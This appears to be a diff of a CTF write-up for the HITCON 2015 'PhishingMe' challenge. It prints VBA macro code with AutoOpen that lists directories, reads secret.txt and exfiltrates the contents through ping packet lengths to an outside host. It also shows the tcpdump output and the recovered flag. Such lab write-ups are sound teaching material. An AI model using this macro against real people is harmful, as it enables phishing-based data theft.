@@ -1,4 +1,4 @@
-Title: PhishingMe
+My team, CLGT.
 
 Description:
 
@@ -11,24 +11,26 @@ From the information, we know this challenge is all about macro. Requirement wil
 
 - MS Windows
 - Ms Word with Macro
-- Email title with HITCON 2015
-- Email Address to phishing.me.hitcon.2015@gmail.com
+- Email with subject "HITCON 2015"
+- RCPT TO: phishing.me.hitcon.2015@gmail.com
 
 Once all this condition is fulfilled. We received an confirmation email from HITCON
-I've read your doc. Interesting
-First guess was, ping to home 
-Shell ("ping -n 1 my.ip.add.ress")
-TCPDUMP from home with ICMP on. Bingo, we go packets We went and wrote few more connection script like email, web and DNS. Looks like we got no luck at all. So we concluded.
+> I've read your doc. Interesting
+
+First guess was, ping to home
+> Shell ("ping -n 1 my.ip.add.ress")
+
+TCPDUMP from home with ICMP on. Bingo, packet received. We went and wrote few more connection script like email and web. Looks like we got no luck at all. So we concluded,
 
 - NO Outgoing TCP Allowed (** ppp solved it with DNS)
 
-Concluded only ICMP able to to go out from the box. So, we did another test. 
+Looks like ICMP able to to go out from the box. So, we did another test.
 
 > Shell ("ping -n 1 -l 2 my.ip.add.ress")
 
-And we received 
+And we received
 
-11:29:43.643405 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2249, length 10
+> 11:29:43.643405 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2249, length 10
 
 This is clear that we can somehow use the length to pass some data. So, first thing is. We want to know where are we.
 ```
@@ -42,7 +44,7 @@ For i = 1 To Len(strString)
 Next
 ```
 
-Next From the ping with length, we convert back the Dec value back to ASCII, we got PATH Secondly, we go a "dir" 
+Next From the ping with length, we convert back the Dec value back to ASCII, we got PATH Secondly, we go a "dir"
 
 ```
 Set objFSO = CreateObject("Scripting.FileSystemObject")
@@ -71,7 +73,7 @@ For Each objFile In colFiles
 Next
 ```
 
-Nothing seems to me interesting. So we change and code a little bit and do a dir on "C:\", we found secret.txt !!! Another peace of code to show what is in secret.txt 
+Nothing seems to me interesting. So we change and code a little bit and do a dir on "C:\", we found secret.txt !!! Another peace of code to show what is in secret.txt
 
 ```
 Sub AutoOpen()
@@ -103,7 +105,7 @@ Close #1
         'MsgBox strHex
         strDec = CLng("&h" & strHex)
         strDec = strDec - 8
-        
+
         For iCount = 1 To 10000000
         Next iCount
         'MsgBox (strHex & " " & strDec)
@@ -114,22 +116,22 @@ Close #1
 End Sub
 ```
 
-From TCPDUMP we received 
+From TCPDUMP we received
 ```
-11:29:41.058538 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2215, length 104 
-11:29:41.058617 IP my.ip.add.ress > 54.92.10.249: ICMP echo reply, id 1, seq 2215, length 104 11:29:41.128465 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2216, length 105 
-11:29:41.128542 IP my.ip.add.ress > 54.92.10.249: ICMP echo reply, id 1, seq 2216, length 105 
-11:29:41.202369 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2217, length 116 
+11:29:41.058538 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2215, length 104
+11:29:41.058617 IP my.ip.add.ress > 54.92.10.249: ICMP echo reply, id 1, seq 2215, length 104 11:29:41.128465 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2216, length 105
+11:29:41.128542 IP my.ip.add.ress > 54.92.10.249: ICMP echo reply, id 1, seq 2216, length 105
+11:29:41.202369 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2217, length 116
 11:29:41.202441 IP my.ip.add.ress > 54.92.10.249: ICMP echo reply, id 1, seq 2217, length 116
 --- More ICMP Traffic ---
 11:29:44.321431 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2258, length 125
 11:29:44.321527 IP my.ip.add.ress > 54.92.10.249: ICMP echo reply, id 1, seq 2258, length 125
 ```
 
-By taking all the length, we got the string as 
+By taking all the length, we got the string as
 
 > hitcon{m4cr0_ma1ware_1s_m4k1ng_a_c0meb4ck!!}
 
-Done !!! 
+Done !!!
 
 Special thanks to k9 from CLGT
